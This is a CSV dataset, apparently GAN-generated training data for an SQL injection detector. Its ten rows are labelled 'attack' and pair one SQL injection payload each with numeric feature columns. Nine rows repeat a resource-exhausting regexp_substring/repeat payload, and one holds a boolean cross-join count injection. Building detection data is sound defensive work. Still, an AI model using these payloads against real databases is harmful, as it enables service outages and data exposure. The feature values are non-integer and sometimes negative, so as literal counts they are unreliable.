id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000116,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000706,3.9982068018288284,160.35079956054688,56.38166809082031,18.51849937438965,42.514705657958984,-0.027505457401275635,44.095394134521484,13.342066764831543,0.9988574981689453,0.3598525822162628,0.15777914226055145,0.34669721126556396,0.13418981432914734,3.725064992904663,1.1708425283432007,0.7892571091651917,0.7851583361625671,-0.05739409849047661,-0.02719278261065483,-0.010865130461752415,3.6028952598571777,5.1207685470581055,1.2212879657745361,0.022671859711408615,1.562117099761963,-0.4468439817428589,0.05221319943666458,0.5015080571174622,0.48382091522216797,-0.0201182272285223,0.027093706652522087,0.3779851198196411,0.057987723499536514,-0.00596000999212265,0.39128926396369934,1.2992596626281738,3.083179473876953,1.3501026630401611,0.7878968119621277,-0.1546887457370758,0.18743984401226044,0.4992443025112152,0.09812513738870621,0.2520427405834198,0.12112770974636078,-0.17524829506874084,0.03899518400430679,0.060813646763563156,0.046723075211048126,-0.007058986462652683,0.22748282551765442,0.08114317059516907,-0.08575329184532166,0.3054312467575073,0.006265238858759403,0.184154212474823,-0.023962780833244324,0.16068653762340546,0.13139314949512482,0.009701922535896301,0.16310769319534302,-0.11961513012647629,-0.2981458306312561,-0.35154762864112854,0.2708815634250641,0.017803700640797615,-0.020275646820664406,-0.282975971698761,-0.10540082305669785,-0.3938942551612854,0.04830064997076988,-0.09713993966579437,-0.5039030909538269,-0.03718097135424614,-0.3155468702316284,0.2824310064315796,0.6359844207763672,0.6519670486450195,0.38324734568595886,0.23298443853855133,0.2834778428077698,4.511677265167236,0.8133466839790344,-0.46238458156585693,-0.001651264727115631,-0.028955593705177307,-0.10756079852581024,-0.49966558814048767,0.025499530136585236
GAN_000117,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000706,3.6878309284626902,152.49803161621094,57.39778518676758,19.90949249267578,41.11805725097656,-0.06895118951797485,38.50249099731445,15.489030838012695,1.000076174736023,0.3348742723464966,0.1615293174982071,0.3280577063560486,0.14226862788200378,3.736473798751831,1.5883548259735107,0.44852739572525024,1.0587366819381714,-0.03846503421664238,-0.07778630405664444,0.015861060470342636,5.125181198120117,4.472471237182617,1.8003175258636475,0.009047497063875198,1.4339901208877563,-0.6481133699417114,0.07665501534938812,0.47095832228660583,-0.3084411323070526,0.08001146465539932,0.0359061025083065,0.27558764815330505,0.02800634503364563,0.3332732319831848,0.43779805302619934,1.3293147087097168,2.465317726135254,0.9026395678520203,0.670642077922821,-0.08476176112890244,0.2528036832809448,0.5199475884437561,0.13836534321308136,-0.05889242887496948,0.11242029070854187,0.08332529664039612,-0.18725144863128662,0.0538184680044651,0.042426519095897675,-0.02416042424738407,0.06017104163765907,0.12193165719509125,0.12185844033956528,0.10946986079216003,-0.11464042216539383,-0.03668087720870972,-0.0008079470135271549,0.20333260297775269,0.07675611972808838,0.1728469431400299,0.06624867767095566,0.07585041224956512,-0.0929705947637558,-0.6342169642448425,0.09920984506607056,0.03544338047504425,-0.014345630072057247,-0.44849148392677307,-0.1818656623363495,-0.4071842432022095,-0.004704192280769348,-0.03827382251620293,-0.5747619271278381,-0.03699202090501785,-0.3117208778858185,0.25084197521209717,0.66739821434021,0.6388057470321655,0.17698317766189575,0.1448594331741333,0.14417757093906403,4.682827949523926,0.8639301657676697,-0.12045064568519592,-0.16953735053539276,0.01842407137155533,-0.2150496542453766,-0.14711888134479523,0.011994075961411
GAN_000118,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000706,3.8305208106340185,146.0599365234375,53.39499282836914,22.691709518432617,52.931766510009766,-0.06552033871412277,42.78795623779297,16.050622940063477,0.9994314908981323,0.3598021864891052,0.15923777222633362,0.3362559378147125,0.143464595079422,3.8064444065093994,1.6312724351882935,0.7785537838935852,0.934354305267334,-0.024241317063570023,0.09733588993549347,0.042559489607810974,4.601163387298584,5.501556873321533,2.469923257827759,0.016178157180547714,1.427368402481079,-0.43747809529304504,0.04232126846909523,0.4819991886615753,1.1170178651809692,0.2039661705493927,0.04311641678214073,-0.08327672630548477,0.1375514417886734,0.2014959305524826,0.4746205508708954,1.3214747905731201,3.312253475189209,1.1170930862426758,0.8741731643676758,-0.3295736014842987,0.21537943184375763,0.5249570608139038,0.1416311413049698,0.13216060400009155,-0.13330456614494324,0.10374242812395096,-0.29307499527931213,0.13738152384757996,0.16793102025985718,-0.019554832950234413,0.1511816531419754,0.031802162528038025,0.02197335660457611,-0.07516186684370041,-0.16711391508579254,0.2224418818950653,0.0010863500647246838,0.26306262612342834,-0.1771296113729477,-0.033329807221889496,0.18535080552101135,-0.20580162107944489,-0.25897905230522156,-0.3272571861743927,-0.08659208565950394,-0.008915940299630165,-0.04504355043172836,-0.43927261233329773,-0.1192847192287445,-0.14559361338615417,-0.023223433643579483,-0.11143559217453003,-0.4447314143180847,-0.03677225857973099,-0.23183505237102509,0.09907612204551697,0.8010484576225281,0.500292956829071,0.37867265939712524,0.33348843455314636,-0.02980758249759674,5.041813850402832,0.7795875072479248,-0.27415257692337036,0.009712599217891693,0.04004167765378952,-0.11808542907238007,-0.29402437806129456,0.00024362637486774474
GAN_000119,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000706,4.165364935725517,156.84605407714844,51.92661666870117,22.775484085083008,41.895816802978516,-0.10434288531541824,47.21993637084961,14.88041877746582,0.9985464215278625,0.35512328147888184,0.16264837980270386,0.3208182752132416,0.1383691430091858,3.733515739440918,1.5596729516983032,0.9565305709838867,0.8772196173667908,-0.03340545669198036,0.07689716666936874,0.038012176752090454,6.078191757202148,5.080376625061035,1.8516510725021362,0.0192918349057436,1.4404929876327515,-0.1367243528366089,0.04180381819605827,0.2666926383972168,1.419148325920105,0.1826152205467224,0.022318683564662933,-0.1477493941783905,0.10659945756196976,0.12793096899986267,0.2764543294906616,1.2939609289169312,3.451794385910034,1.452168583869934,0.6958827376365662,-0.23271018266677856,0.2953011393547058,0.5521847009658813,0.30851423740386963,0.1910712867975235,0.2534613013267517,-0.10557834059000015,-0.015617139637470245,0.11548785120248795,0.16787488758563995,0.12014468014240265,0.2686392664909363,0.06566645950078964,0.22745494544506073,0.2254609614610672,-0.2729138135910034,0.31606626510620117,-0.0032041813246905804,0.28680163621902466,-0.10810050368309021,0.3421405553817749,0.20676660537719727,-0.3431529998779297,-0.3176589608192444,0.34890398383140564,0.08559682220220566,-0.0018331690225750208,-0.05224916338920593,-0.316965788602829,-0.034488141536712646,-0.1478109359741211,-0.12194783985614777,-0.05642158165574074,-0.25602269172668457,-0.04720830172300339,-0.2390596717596054,0.11623810976743698,0.6836419105529785,0.379077285528183,0.21372321248054504,0.4264974892139435,0.28669434785842896,4.313137054443359,0.8326818943023682,-0.3322497606277466,0.2440415322780609,0.19845980405807495,0.07791867852210999,-0.5111120343208313,0.0450703427195549
GAN_000120,attack,boolean,"1%'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000101,5.021632340831617,148.5005340576172,78.20169830322266,17.2353572845459,42.51659393310547,-0.09526705741882324,35.04388427734375,13.801932334899902,1.0001859664916992,0.3576565980911255,0.14335982501506805,0.3109276592731476,0.13996125757694244,3.84067702293396,1.8511476516723633,0.8904127478599548,1.16134512424469,-0.13091740012168884,-0.042085547000169754,0.034844037145376205,4.85656213760376,3.672893762588501,2.6443111896514893,0.011980767361819744,1.4033218622207642,-1.355089545249939,0.13322485983371735,0.5875647664070129,-0.27687904238700867,-0.1604488044977188,0.0735195130109787,0.5596119165420532,-0.05110923573374748,0.6924044489860535,0.6307908296585083,1.1301662921905518,-0.24187974631786346,0.7585012912750244,0.8668686747550964,-0.39605095982551575,0.21760672330856323,0.6838324666023254,-0.18607807159423828,0.17546159029006958,-0.21212071180343628,0.38621923327445984,-0.39784154295921326,0.08250037580728531,0.01902698539197445,-0.17564179003238678,0.06425502151250839,0.17151875793933868,-0.1706804484128952,0.25598791241645813,-0.1703922152519226,0.15430963039398193,-0.03409554064273834,0.3516346514225006,0.30894508957862854,0.03838887810707092,0.32718977332115173,0.6649158000946045,-0.3221108913421631,-2.8459248542785645,-0.17243455350399017,-0.010424887761473656,-0.028613517060875893,-0.6353904604911804,-0.19417953491210938,-0.7431514859199524,-0.09194578230381012,-0.3363148272037506,-1.0521222352981567,-0.08014295250177383,-0.5623793005943298,0.3453083634376526,0.6242596507072449,0.5289255976676941,0.572514533996582,-0.05852543190121651,-0.11940144002437592,3.2060086727142334,0.7812212109565735,-0.26922523975372314,-0.5433133244514465,-0.18215452134609222,-0.33508622646331787,0.001550920307636261,0.011918289586901665
GAN_000121,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000706,4.755323659668973,129.35501098632812,72.0473403930664,19.634437561035156,31.916763305664062,-0.1583520472049713,28.223438262939453,14.13211441040039,1.0006719827651978,0.3260420262813568,0.1558932512998581,0.31449952721595764,0.14664335548877716,3.728882312774658,1.9494919776916504,0.7858357429504395,1.3290148973464966,-0.06584788113832474,-0.1854138821363449,0.035233981907367706,5.535341262817383,3.6623382568359375,2.1601662635803223,-0.008479347452521324,1.3984659910202026,-1.102825403213501,0.12521769106388092,0.5627025365829468,-1.0582529306411743,-0.06548600643873215,0.05028124898672104,0.42217856645584106,-0.0784725546836853,0.7549564242362976,0.46627458930015564,1.2252452373504639,0.21020503342151642,0.7523266673088074,0.6860632300376892,-0.2881416082382202,0.34308353066444397,0.5701234936714172,0.04368940368294716,-0.03689044713973999,0.16878141462802887,0.2814168334007263,-0.19339856505393982,0.09571359306573868,-0.04878763109445572,-0.09236962348222733,0.06268652528524399,0.2634516954421997,-0.041215792298316956,0.31041812896728516,-0.15075276792049408,0.032052181661129,-0.003983210306614637,0.34798210859298706,0.1875910460948944,0.27598443627357483,0.258865624666214,0.7124080061912537,-0.4459284842014313,-1.3421200513839722,0.03331255912780762,0.03835006058216095,0.0025592967867851257,-0.48351219296455383,-0.19875197112560272,-0.7007997632026672,-0.22658798098564148,-0.4024309813976288,-0.8747962713241577,-0.08381021022796631,-0.5431498885154724,0.4705185890197754,0.5098690986633301,0.42266029119491577,0.16762498021125793,-0.058569569140672684,-0.056312233209609985,3.1481568813323975,0.8543230295181274,-0.2477593868970871,-0.6606159806251526,-0.08128131926059723,-0.41285935044288635,-0.0009819269180297852,0.014436802826821804
GAN_000122,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000706,4.223790718266465,158.1508331298828,66.48377227783203,19.018354415893555,29.09881019592285,-0.14974288642406464,34.28952407836914,14.542061805725098,1.000115990638733,0.33522093296051025,0.15689760446548462,0.32245659828186035,0.14652444422245026,3.930495262145996,1.6232808828353882,0.6727098226547241,1.0961236953735352,-0.08960861712694168,-0.0507923848927021,0.029561540111899376,6.629486083984375,4.0152435302734375,2.0337674617767334,-0.010385323315858841,1.3473572731018066,-0.9681382179260254,0.10978095978498459,0.29708918929100037,-0.5679680109024048,-0.04743571951985359,0.05647648498415947,0.22145670652389526,-0.10201571881771088,0.44072771072387695,0.4337403476238251,1.036435604095459,1.9504305124282837,1.1383609771728516,0.7008271813392639,-0.15010520815849304,0.26600974798202515,0.5285412073135376,0.08575837314128876,-0.005211584270000458,-0.08690644055604935,0.09872887283563614,-0.13286666572093964,0.09866612404584885,0.026238759979605675,-0.016886228695511818,0.16701819002628326,0.196824312210083,0.12698659300804138,0.17628373205661774,-0.3807251453399658,-0.12177123129367828,-0.017262151464819908,0.2806409001350403,0.26065149903297424,0.2581039071083069,0.019353210926055908,0.28072822093963623,-0.4890560209751129,-0.980144202709198,-0.04294838756322861,0.011072628200054169,-0.043487533926963806,-0.3533758521080017,-0.1653135120868683,-0.5219223499298096,-0.13215261697769165,0.06413699686527252,-0.477233350276947,-0.075077123939991,-0.32842448353767395,0.18342463672161102,0.357954740524292,0.3789839446544647,0.2054922878742218,0.14721539616584778,0.15311181545257568,3.255972146987915,0.8955095410346985,-0.3763353228569031,-0.3452446460723877,0.204189732670784,0.0923495888710022,-0.06789888441562653,0.026414914056658745
GAN_000123,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000706,4.074077107960625,139.20472717285156,62.03080368041992,20.57488441467285,29.16929054260254,-0.07029737532138824,35.8375358581543,15.463902473449707,0.9999208450317383,0.3201872706413269,0.16765686869621277,0.33121946454048157,0.13807711005210876,3.6612892150878906,1.4630396366119385,0.4610058665275574,1.2404310703277588,-0.07174033671617508,-0.09647049754858017,0.008338898420333862,3.837568998336792,4.586152076721191,1.5631269216537476,0.008400991559028625,1.4062728881835938,-0.5896519422531128,0.0855606198310852,0.6464788317680359,0.24952857196331024,-0.018455466255545616,0.039361581206321716,0.3219950497150421,0.0023446043487638235,0.5003745555877686,0.4318365752696991,1.413860559463501,1.7181169986724854,0.9267610311508179,0.6243850588798523,-0.35346853733062744,0.30331239104270935,0.5062868595123291,0.15445579588413239,-0.06486335396766663,0.03985476493835449,0.07242456078529358,-0.09557877480983734,0.10414564609527588,0.02621453069150448,-0.07117944210767746,0.13409504294395447,0.14493796229362488,-0.1851874738931656,0.19051693379878998,-0.009934009984135628,0.19944672286510468,0.0013231751509010792,0.3522585332393646,-0.06520852446556091,0.18734091520309448,0.1740184724330902,0.3712185025215149,-0.25910529494285583,-0.27179041504859924,0.34433338046073914,0.03269229829311371,0.008177598007023335,-0.5319591760635376,-0.18086449801921844,-0.6005028486251831,0.015138983726501465,-0.3859594762325287,-0.6681268215179443,-0.056406669318675995,-0.43159979581832886,0.3744538128376007,0.6768967509269714,0.5676622986793518,0.23782476782798767,0.10257170349359512,-0.0327189564704895,3.5472044944763184,0.8420113325119019,-0.08291047811508179,-0.24714557826519012,0.05831599235534668,-0.34993669390678406,-0.5183112025260925,0.015457584522664547
GAN_000124,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000706,4.381516121289529,168.72903442382812,63.043418884277344,21.412233352661133,43.186038970947266,-0.14746889472007751,35.82469940185547,11.035445213317871,0.9992467164993286,0.39031511545181274,0.1468469798564911,0.32961899042129517,0.13649827241897583,3.8885715007781982,1.7045040130615234,0.9704524874687195,0.8363751173019409,-0.028335895389318466,0.052415575832128525,0.03240952268242836,8.312251091003418,5.36810827255249,2.015242338180542,0.00034112329012714326,1.3831485509872437,-0.4965488314628601,0.10446655750274658,0.3060847222805023,0.45258989930152893,0.04176647588610649,0.05217250436544418,0.14362484216690063,0.021794013679027557,0.06185735762119293,0.3495457172393799,1.249123215675354,4.004589080810547,1.3785595893859863,0.9406742453575134,-0.269376277923584,0.2610148787498474,0.580507755279541,0.10201797634363174,0.15047213435173035,0.19755692780017853,-0.33534732460975647,-0.22087979316711426,0.08237775415182114,0.13939505815505981,0.05944538116455078,0.1831710785627365,0.07385165244340897,0.35394012928009033,0.4076049029827118,-0.3433062434196472,0.01653127372264862,0.0018617543391883373,0.12305687367916107,0.08128543198108673,0.2670244872570038,0.3274921178817749,-0.2534664273262024,-0.43704554438591003,-1.0450056791305542,0.05589072406291962,0.017641546204686165,-0.05593583732843399,-0.2970600128173828,-0.18588711321353912,-0.2934168875217438,-0.10004155337810516,0.12733103334903717,-0.5843325853347778,-0.05299844592809677,-0.21433448791503906,-0.06199484318494797,0.4885081350803375,0.563961386680603,0.1724105179309845,0.3165470361709595,0.43068939447402954,4.873870849609375,0.8360751271247864,-0.6295981407165527,0.1436052918434143,0.22353672981262207,0.12915019690990448,-0.23103514313697815,0.03924122452735901
GAN_000125,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000706,3.7411761478815344,163.9766845703125,51.074649810791016,21.420455932617188,42.8253173828125,-0.053593896329402924,37.536373138427734,13.098377227783203,0.9999731183052063,0.3464343547821045,0.1702556610107422,0.33804142475128174,0.1460619419813156,3.717449426651001,1.2951171398162842,0.713670551776886,0.9780019521713257,0.036605726927518845,-0.05119145289063454,0.03361763805150986,4.278421878814697,4.828752040863037,1.8944758176803589,0.004095626529306173,1.5426645278930664,-0.532164454460144,0.058881573379039764,0.4983503818511963,0.26097187399864197,0.11343572288751602,0.03894279524683952,0.3822649419307709,-0.009095858782529831,0.158315509557724,0.39453381299972534,1.3319764137268066,2.713284969329834,0.8226140141487122,0.5686339735984802,0.012113936245441437,0.0941636711359024,0.5218101739883423,-0.05755484104156494,0.1378406286239624,0.10703320801258087,0.10346753150224686,-0.1499711573123932,0.058517828583717346,0.0546346977353096,-0.04380211979150772,0.09636756032705307,0.10498994588851929,0.18680547177791595,0.2154901772737503,-0.16186411678791046,0.2118087112903595,-0.002731176558881998,0.3487664759159088,0.09363092482089996,-0.1515434980392456,0.1793319582939148,-0.030603837221860886,-0.20817333459854126,-0.48398521542549133,-0.06439625471830368,-0.003799466649070382,-0.011124513112008572,-0.26848897337913513,-0.14906363189220428,-0.1566339135169983,-0.029660221189260483,0.043915074318647385,-0.7087288498878479,-0.02545984834432602,-0.2256850004196167,0.42766278982162476,0.6410382390022278,0.6361086964607239,0.29324209690093994,0.19816605746746063,0.24411623179912567,4.474432945251465,0.7929725050926208,-0.21778307855129242,-0.12252126634120941,-0.20048509538173676,-0.22928909957408905,-0.10060326755046844,-0.007912218570709229
